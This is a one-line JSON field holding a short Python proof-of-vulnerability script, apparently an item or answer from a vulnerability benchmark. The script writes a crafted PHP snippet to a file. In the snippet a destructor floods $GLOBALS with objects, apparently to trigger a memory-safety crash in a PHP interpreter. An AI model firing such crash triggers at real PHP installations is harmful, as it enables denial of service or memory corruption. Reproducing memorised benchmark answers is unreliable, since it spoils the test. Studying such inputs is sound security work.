    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b'<?class ctor{function __destruct(){for(;$i<100;++$i){$GLOBALS[\"$i\"]=new stdClass;}}}$\\xff=new ctor?>'\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
